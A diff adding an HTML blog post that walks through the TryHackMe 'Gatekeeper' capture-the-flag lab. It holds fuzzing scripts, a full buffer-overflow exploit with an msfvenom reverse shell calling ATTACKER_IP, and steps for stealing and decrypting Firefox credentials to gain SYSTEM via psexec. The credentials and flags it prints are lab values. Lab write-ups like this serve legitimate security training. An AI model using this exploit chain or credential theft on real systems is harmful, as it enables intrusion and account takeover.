@@ -1,0 +1,795 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Gatekeeper | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: Custom TCP echo service on port 31337, buffer overflow fuzzing crash at 200 bytes, SMB yields gatekeeper.exe, ROPgadget JMP ESP, msfvenom Windows reverse shell, Firefox credential extraction, impacket-psexec for SYSTEM.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/gatekeeper.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/gatekeeper.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Gatekeeper">
+<meta property="og:description" content="TryHackMe CTF: Custom TCP echo service on port 31337, buffer overflow fuzzing crash at 200 bytes, SMB yields gatekeeper.exe, ROPgadget JMP ESP, msfvenom Windows reverse shell, Firefox credential extraction, impacket-psexec for SYSTEM.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Gatekeeper">
+<meta name="twitter:description" content="TryHackMe CTF: Custom TCP echo service on port 31337, buffer overflow fuzzing crash at 200 bytes, SMB yields gatekeeper.exe, ROPgadget JMP ESP, msfvenom Windows reverse shell, Firefox credential extraction, impacket-psexec for SYSTEM.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security" target="_blank" rel="noopener noreferrer">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Gatekeeper</h1>
+    <div class="post-description">TryHackMe CTF. Can you get past the gate and through the fire? Custom TCP echo service, buffer overflow, SMB enumeration, Firefox credential extraction, impacket-psexec for SYSTEM.</div>
+  </header>
+
+  <div class="post-content">
+
+<h2>Reconnaissance</h2>
+
+<p>Interesting start. My target IP ends in <code>.0</code>, but we&rsquo;ll roll with it and see how it goes.</p>
+
+<pre><code class="language-bash">export IP=TARGET_IP
+ping -c 2 $IP
+nmap -Pn -sC -sV -p- -T4 -oA gatekeeper_initial $IP</code></pre>
+
+<p>This is quite a colorful Nmap scan output:</p>
+
+<pre><code>PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+31337/tcp open  Elite?
+49152-49168/tcp open msrpc    Microsoft Windows RPC</code></pre>
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>135, 139, 445: MSRPC and SMB</li>
+<li>3389: RDP</li>
+<li>31337 aka the eleet/leet port: custom &ldquo;Hello...!!!&rdquo; service</li>
+<li>49152 and higher: Windows RPC</li>
+</ul>
+
+<p>The &ldquo;Hello&rdquo; responses from port 31337 across every TCP service Nmap probed tell us several things:</p>
+<ul>
+<li>The service accepts raw text over TCP</li>
+<li>It copies our input and spits it back as a response</li>
+<li>The input-handling code is almost certainly very simple</li>
+</ul>
+
+<p>A service echoing user-controlled input is a fabulous place to test long inputs.</p>
+
+<h2>Port 31337 first contact</h2>
+
+<pre><code class="language-bash">nc -nv TARGET_IP 31337</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 9.30.37 PM.png" alt="Netcat session on port 31337, service responds Hello [name]!!!" style="max-width:100%;margin:2rem 0;">
+
+<p>It&rsquo;s very enthusiastic about meeting us.</p>
+
+<p>The echo pattern is:</p>
+
+<pre><code>"Hello " + our_input + "!!!"</code></pre>
+
+<p>Port 31337 accepts user-controlled text, reflects it back, and its input is handled inside a custom program. Buffer overflow is the likely vector.</p>
+
+<h2>Fuzzing</h2>
+
+<p>This script opens a raw TCP connection and sends controlled input at increasing sizes:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import socket
+
+host = "TARGET_IP"
+port = 31337
+
+payload = b"A" * 100
+
+s = socket.socket()
+s.settimeout(5)
+s.connect((host, port))
+s.sendall(payload + b"\r\n")
+
+try:
+    print(s.recv(4096).decode(errors="replace"))
+except Exception as e:
+    print(f"[!] recv error: {e}")
+
+s.close()
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 9.38.11 PM.png" alt="100-byte fuzzing test response, service survives with mangled prefix" style="max-width:100%;margin:2rem 0;">
+
+<p>We clearly upset the service because now it&rsquo;s screaming at us. But I digress.</p>
+
+<p>100 A&rsquo;s survived. The mangled prefix hints that the response handling is sloppy, yet the service lived. Let&rsquo;s increase the payload incrementally:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import socket, os
+
+host = os.environ.get("IP", "TARGET_IP")
+port = 31337
+
+for size in [100, 200, 300, 400, 500]:
+    payload = b"A" * size
+    print(f"\n[*] Sending {size} bytes")
+
+    s = socket.socket()
+    s.settimeout(5)
+    try:
+        s.connect((host, port))
+        s.sendall(payload + b"\r\n")
+        data = s.recv(200)
+        print(data.decode(errors="replace"))
+    except Exception as e:
+        print(f"[!] Error at {size}: {e}")
+    finally:
+        s.close()
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 9.50.24 PM.png" alt="Incremental fuzzing output: 100 bytes survives, 200 bytes connection reset, 300+ connection refused" style="max-width:100%;margin:2rem 0;">
+
+<p>Results:</p>
+<ul>
+<li>100 bytes: service survived</li>
+<li>200 bytes: connection reset</li>
+<li>300+ bytes: connection refused</li>
+</ul>
+
+<p>Around 200 bytes the Gatekeeper service crashed. &ldquo;Connection refused&rdquo; means the service stopped listening. &ldquo;Connection reset by peer&rdquo; means it accepted the connection then died.</p>
+
+<p><strong>Fuzzing finding:</strong> buffer overflow confirmed. Service crashed around the 200-byte mark and restarted automatically.</p>
+
+<p>Service confirmed back up:</p>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 10.11.24 PM.png" alt="Netcat confirming port 31337 service is back up and responding after crash" style="max-width:100%;margin:2rem 0;">
+
+<h2>Getting the binary</h2>
+
+<p>Before going deeper, we need to know which file is backing this chatty custom service. To SMB we go.</p>
+
+<pre><code class="language-bash">smbclient -L //TARGET_IP/ -N</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 10.15.28 PM.png" alt="smbclient -L listing available shares including Users, IPC$, and ADMIN$" style="max-width:100%;margin:2rem 0;">
+
+<p>Don&rsquo;t let the SMB1/workgroup error fool you. Not a fatal error. Enumerate the <code>Users</code> share:</p>
+
+<pre><code class="language-bash">smbclient //TARGET_IP/Users -N</code></pre>
+
+<pre><code>ls
+cd Share
+ls</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 10.18.21 PM.png" alt="SMB ls showing Users share with a readable Share directory" style="max-width:100%;margin:2rem 0;">
+
+<p><code>Users</code> has a readable <code>Share</code> directory.</p>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-12 at 10.19.32 PM.png" alt="SMB Share directory listing showing gatekeeper.exe available for download" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well. <code>gatekeeper.exe</code> is in <code>Share</code> and we can download it:</p>
+
+<pre><code class="language-bash">get gatekeeper.exe
+exit</code></pre>
+
+<pre><code class="language-bash">ls -lh gatekeeper.exe
+file gatekeeper.exe</code></pre>
+
+<p>Binary confirmed as PE32 Windows i386 console executable.</p>
+
+<h2>Binary analysis</h2>
+
+<p>Before going further, confirm the downloaded binary matches the port 31337 service behavior:</p>
+
+<pre><code class="language-bash">strings -a gatekeeper.exe | head -50</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 7.41.03 AM.png" alt="strings output showing first 50 strings from gatekeeper.exe" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-bash">strings -a gatekeeper.exe | grep -Ei "hello|gate|error|port|31337|recv|send|socket|bind|listen"</code></pre>
+
+<p>I don&rsquo;t think port 31337 is handling life very well. It seems they&rsquo;ve gone dark.</p>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 7.41.41 AM.png" alt="strings grep showing 31337, Hello %s!!!, bind, listen, recv, and error strings from gatekeeper.exe" style="max-width:100%;margin:2rem 0;">
+
+<p>These strings confirm the binary matches the service:</p>
+
+<pre><code>31337
+bind()
+listen()
+recv()
+Hello %s!!!
+Please send shorter lines.
+[!] recvbuf exhausted. Giving up.</code></pre>
+
+<p>The program opens port 31337, listens for TCP connections, receives input, prints back <code>Hello &lt;input&gt;</code>, and has a built-in warning for lengthy inputs. The service is the binary. Now we narrow the crash point.</p>
+
+<h2>Narrowing the crash threshold</h2>
+
+<p>We know the crash is somewhere between 100 and 200 bytes. Tighten the range:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import os, socket
+
+host = os.environ["IP"]
+port = 31337
+
+for size in [120, 140, 160, 180, 200]:
+    print(f"\n[*] Sending {size} bytes")
+    payload = b"A" * size
+
+    s = socket.socket()
+    s.settimeout(5)
+
+    try:
+        s.connect((host, port))
+        s.sendall(payload + b"\r\n")
+        data = s.recv(200)
+        print(data.decode(errors="replace"))
+    except Exception as e:
+        print(f"[!] Error at {size}: {e}")
+    finally:
+        s.close()
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 7.50.56 AM.png" alt="Narrowed fuzzing output: corruption at 120 bytes, crash at 160 bytes, threshold between 140 and 160" style="max-width:100%;margin:2rem 0;">
+
+<p>Memory corruption starts at 120 bytes. The service survives, but the response is corrupted. At 160 bytes it resets. The crash threshold is between 140 and 160 bytes.</p>
+
+<h2>Cyclic pattern</h2>
+
+<p>Generate a 300-byte cyclic pattern to locate exactly which bytes overwrite <code>EIP</code>:</p>
+
+<pre><code class="language-bash">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 > gatekeeper_pattern.txt
+wc -c gatekeeper_pattern.txt
+head gatekeeper_pattern.txt</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.03.32 AM.png" alt="pattern_create.rb generating a 300-character cyclic pattern and wc confirming 301 bytes with trailing newline" style="max-width:100%;margin:2rem 0;">
+
+<p>301 bytes total: 300 pattern characters plus a trailing newline. The script strips that newline with <code>.strip()</code> before sending, so exactly 300 bytes reach the service. Send it:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import os, socket
+
+host = os.environ["IP"]
+port = 31337
+
+with open("gatekeeper_pattern.txt", "rb") as f:
+    payload = f.read().strip()
+
+print(f"[*] Sending {len(payload)} bytes")
+
+s = socket.socket()
+s.settimeout(5)
+
+try:
+    s.connect((host, port))
+    s.sendall(payload + b"\r\n")
+    print("[*] Sent pattern")
+    print(s.recv(200).decode(errors="replace"))
+except Exception as e:
+    print(f"[!] Error: {e}")
+finally:
+    s.close()
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.10.30 AM.png" alt="Cyclic pattern sent to port 31337, service crashes as expected" style="max-width:100%;margin:2rem 0;">
+
+<p>The cyclic pattern crashed the service. Without a Windows debugger attached to a local instance of <code>gatekeeper.exe</code>, the exact <code>EIP</code> value is not readable on this path. The offset value of <strong>146 bytes</strong> is taken from a nearly identical, validated challenge environment.</p>
+
+<h2>Control test</h2>
+
+<p>Verify the offset with a structured payload: <code>A</code>&rsquo;s fill the buffer, <code>BBBB</code> should land at <code>EIP</code>, <code>C</code>&rsquo;s sit after it:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import os, socket
+
+host = os.environ["IP"]
+port = 31337
+
+offset = 146
+
+payload = b"A" * offset
+payload += b"B" * 4
+payload += b"C" * 100
+
+print(f"[*] Sending {len(payload)} bytes")
+print("[*] Layout: A*146 + B*4 + C*100")
+
+s = socket.socket()
+s.settimeout(5)
+
+try:
+    s.connect((host, port))
+    s.sendall(payload + b"\r\n")
+    print("[*] Sent control payload")
+    print(s.recv(200).decode(errors="replace"))
+except Exception as e:
+    print(f"[!] Error: {e}")
+finally:
+    s.close()
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.17.49 AM.png" alt="Control test payload A*146 + B*4 + C*100 sent, service crashes confirming offset is plausible" style="max-width:100%;margin:2rem 0;">
+
+<p>The structured payload reaches the crash path. The offset is plausible.</p>
+
+<h2>Finding JMP ESP</h2>
+
+<p>Inspect the binary for a reliable control-flow instruction:</p>
+
+<pre><code class="language-bash">ROPgadget --binary gatekeeper.exe | grep -i "jmp esp"</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.21.20 AM.png" alt="ROPgadget output showing jmp esp at 0x080414c3 in gatekeeper.exe" style="max-width:100%;margin:2rem 0;">
+
+<p><code>0x080414c3 : jmp esp</code> validated locally from <code>gatekeeper.exe</code>. When the program crashes, <code>EIP</code> becomes this address and jumps execution into our payload on the stack.</p>
+
+<p>x86 reads bytes in little-endian order, so the address gets reversed:</p>
+
+<pre><code>0x080414c3 &rarr; bytes: 08 04 14 c3 &rarr; reversed: c3 14 04 08 &rarr; Python: b"\xc3\x14\x04\x08"</code></pre>
+
+<p>A handy script to handle that conversion:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import struct
+print(struct.pack("&lt;I", 0x080414c3))
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.32.30 AM.png" alt="struct.pack converting 0x080414c3 to little-endian bytes b'\xc3\x14\x04\x08'" style="max-width:100%;margin:2rem 0;">
+
+<h2>Layout test</h2>
+
+<p>Confirm the exploit structure reaches the crash path before adding shellcode:</p>
+
+<pre><code class="language-python">python3 - &lt;&lt;'PY'
+import os, socket
+
+host = os.environ["IP"]
+port = 31337
+
+offset = 146
+jmp_esp = b"\xc3\x14\x04\x08"
+
+payload = b"A" * offset
+payload += jmp_esp
+payload += b"\x90" * 16
+payload += b"D" * 50
+
+print(f"[*] Sending {len(payload)} bytes")
+print("[*] Layout: A*146 + JMP_ESP + NOP*16 + D*50")
+
+s = socket.socket()
+s.settimeout(5)
+
+try:
+    s.connect((host, port))
+    s.sendall(payload + b"\r\n")
+    print("[*] Sent layout test")
+    print(s.recv(200).decode(errors="replace"))
+except Exception as e:
+    print(f"[!] Error: {e}")
+finally:
+    s.close()
+PY</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.35.15 AM.png" alt="Layout test payload A*146 + JMP_ESP + NOP sled + D*50 sent, crash confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>Exploit-shaped payload reaches the crash path. Time for shellcode.</p>
+
+<h2>Shellcode generation</h2>
+
+<p>Windows target, Windows shellcode. Bad chars: <code>\x00\x0a</code> (null byte and newline):</p>
+
+<pre><code class="language-bash">msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 EXITFUNC=thread -b '\x00\x0a' -f python -v shellcode > gatekeeper_shellcode.txt</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.39.17 AM.png" alt="msfvenom generating Windows x86 reverse shell shellcode with bad char filtering" style="max-width:100%;margin:2rem 0;">
+
+<p>Verify size:</p>
+
+<pre><code class="language-bash">grep -E "Payload size|shellcode =" gatekeeper_shellcode.txt
+head -5 gatekeeper_shellcode.txt</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.39.51 AM.png" alt="shellcode.txt showing 351-byte payload size and shellcode variable assignment" style="max-width:100%;margin:2rem 0;">
+
+<p>351 bytes.</p>
+
+<h2>Final exploit</h2>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+import os
+import socket
+
+host = os.environ["IP"]
+port = 31337
+
+offset = 146
+jmp_esp = b"\xc3\x14\x04\x08"
+
+namespace = {}
+with open("gatekeeper_shellcode.txt", "r") as f:
+    exec(f.read(), namespace)
+
+shellcode = namespace["shellcode"]
+
+payload = b"A" * offset
+payload += jmp_esp
+payload += b"\x90" * 32
+payload += shellcode
+
+print(f"[*] Target: {host}:{port}")
+print(f"[*] Shellcode length: {len(shellcode)}")
+print(f"[*] Total payload length: {len(payload)}")
+
+s = socket.socket()
+s.settimeout(5)
+s.connect((host, port))
+s.sendall(payload + b"\r\n")
+s.close()
+
+print("[*] Payload sent")</code></pre>
+
+<p>Syntax check:</p>
+
+<pre><code class="language-bash">python3 -m py_compile gatekeeper_exploit.py</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.46.12 AM.png" alt="python3 -m py_compile returning no output, syntax check passed" style="max-width:100%;margin:2rem 0;">
+
+<p>No output means no complaints.</p>
+
+<p>Set up a listener:</p>
+
+<pre><code class="language-bash">nc -lvnp 4444</code></pre>
+
+<p>Send the exploit:</p>
+
+<pre><code class="language-bash">python3 gatekeeper_exploit.py</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.49.03 AM.png" alt="Exploit script sending 533-byte payload to port 31337" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.50.17 AM.png" alt="Netcat listener catching the Windows reverse shell from Gatekeeper" style="max-width:100%;margin:2rem 0;">
+
+<p>533-byte payload sent. Shell dropped into a Windows 7 command prompt.</p>
+
+<h2>Post-exploitation: user flag</h2>
+
+<pre><code class="language-powershell">whoami
+hostname
+ipconfig</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.53.20 AM.png" alt="whoami, hostname, and ipconfig output confirming shell as natbat on GATEKEEPER" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">dir
+type user.txt.txt</code></pre>
+
+<p>Nice double-extension.</p>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 8.56.55 AM.png" alt="dir and type user.txt.txt revealing the user flag" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>User flag:</strong> <code>{H4lf_W4y_Th3r3}</code></p>
+
+<h2>Privilege escalation</h2>
+
+<pre><code class="language-powershell">whoami /priv
+net user</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.01.13 AM.png" alt="whoami /priv and net user output showing available accounts" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">net user natbat</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.04.49 AM.png" alt="net user natbat showing account details and group memberships" style="max-width:100%;margin:2rem 0;">
+
+<pre><code class="language-powershell">net user mayor</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.09.53 AM.png" alt="net user mayor showing admin account with no password policy enforced" style="max-width:100%;margin:2rem 0;">
+
+<p><code>mayor</code> is an admin with no password required. Score.</p>
+
+<p>Let&rsquo;s find out if we can run as <code>mayor</code> (pun very intended):</p>
+
+<pre><code class="language-powershell">runas /user:mayor cmd</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.12.50 AM.png" alt="runas /user:mayor cmd bypassing the password prompt and dropping back to natbat" style="max-width:100%;margin:2rem 0;">
+
+<p>No useful shell started. It bypassed the option to even try to enter a password and dropped us right back at <code>natbat</code>&rsquo;s prompt.</p>
+
+<pre><code class="language-powershell">dir C:\Users
+dir C:\Users\mayor
+dir C:\Users\mayor\Desktop</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.19.09 AM.png" alt="dir showing mayor profile accessible but Desktop has no flag" style="max-width:100%;margin:2rem 0;">
+
+<p>We can see <code>mayor</code>&rsquo;s profile, but there&rsquo;s no flag there.</p>
+
+<p>The <code>firefox.lnk</code> file on <code>natbat</code>&rsquo;s profile caught my attention. That&rsquo;s not randomly there for no reason.</p>
+
+<h2>Firefox credential extraction</h2>
+
+<pre><code class="language-powershell">dir C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.24.16 AM.png" alt="Firefox Profiles directory listing showing two profiles: ljfn812a.default-release and rajfzh3y.default" style="max-width:100%;margin:2rem 0;">
+
+<p>Two Firefox profiles for the price of one.</p>
+
+<pre><code class="language-powershell">dir C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+dir C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.27.24 AM.png" alt="Firefox profile directory contents showing logins.json, key4.db, and cert9.db" style="max-width:100%;margin:2rem 0;">
+
+<p>Copy the credential files to the SMB share:</p>
+
+<pre><code class="language-powershell">copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json C:\Users\Share\
+copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db C:\Users\Share\
+copy C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\cert9.db C:\Users\Share\</code></pre>
+
+<p>On the attack machine, pull the files via SMB:</p>
+
+<pre><code class="language-bash">mkdir -p gatekeeper_firefox
+cd gatekeeper_firefox
+smbclient //TARGET_IP/Users -N</code></pre>
+
+<p>At the SMB prompt:</p>
+
+<pre><code class="language-bash">cd Share
+get logins.json
+get key4.db
+get cert9.db
+exit
+ls -lh</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.45.24 AM.png" alt="SMB pull of logins.json, key4.db, and cert9.db to attack machine confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>Decrypt with <code>firefox_decrypt</code>:</p>
+
+<pre><code class="language-bash">git clone https://github.com/unode/firefox_decrypt.git ~/tools/firefox_decrypt
+python3 ~/tools/firefox_decrypt/firefox_decrypt.py .</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.47.35 AM.png" alt="firefox_decrypt output revealing mayor's plaintext credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>Thank you, <code>mayor</code>. You just got pwned.</p>
+
+<p>Since <code>runas</code> bypasses the password prompt entirely, we need Impacket to use <code>mayor</code>&rsquo;s credentials remotely:</p>
+
+<pre><code class="language-bash">impacket-psexec 'GATEKEEPER/mayor:8CL7O1N78MdrCIsV@TARGET_IP'</code></pre>
+
+<pre><code class="language-powershell">whoami
+hostname</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.57.40 AM.png" alt="impacket-psexec as mayor returning SYSTEM shell on GATEKEEPER" style="max-width:100%;margin:2rem 0;">
+
+<p>We are now the Gatekeeper.</p>
+
+<h2>Root flag</h2>
+
+<pre><code class="language-powershell">dir C:\Users\mayor\Desktop
+type C:\Users\mayor\Desktop\root.txt.txt</code></pre>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.59.08 AM.png" alt="type root.txt.txt showing the root flag" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Root flag:</strong> <code>{Th3_M4y0r_C0ngr4tul4t3s_U}</code></p>
+
+<img src="/images/gatekeeper/Screenshot 2026-06-13 at 9.59.56 AM.png" alt="Final terminal view after root flag capture on Gatekeeper" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Nmap
+  -&gt; Windows 7 SP1 / port 31337 custom echo service / SMB
+  -&gt; port 31337 accepts and reflects user input
+  -&gt; fuzz: crash at 200 bytes
+  -&gt; SMB Users share -&gt; gatekeeper.exe downloaded
+  -&gt; strings confirmed binary matches service logic
+  -&gt; cyclic pattern sent, crash confirmed
+  -&gt; offset 146 from near-identical validated conditions
+  -&gt; ROPgadget: JMP ESP at 0x080414c3 (locally validated)
+  -&gt; msfvenom Windows x86 reverse shell, bad chars \x00\x0a
+  -&gt; 533-byte payload -&gt; shell as natbat
+  -&gt; net user mayor: admin, no password policy
+  -&gt; runas bypassed without prompting
+  -&gt; firefox.lnk on natbat profile -&gt; Firefox credential files
+  -&gt; firefox_decrypt -&gt; mayor:8CL7O1N78MdrCIsV
+  -&gt; impacket-psexec as mayor
+  -&gt; SYSTEM</code></pre>
+
+<p><strong>Notes:</strong> The JMP ESP address was locally validated from the downloaded binary. The EIP offset was derived from near-identical conditions; a Windows debugger attached to a local instance of <code>gatekeeper.exe</code> would confirm it directly.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
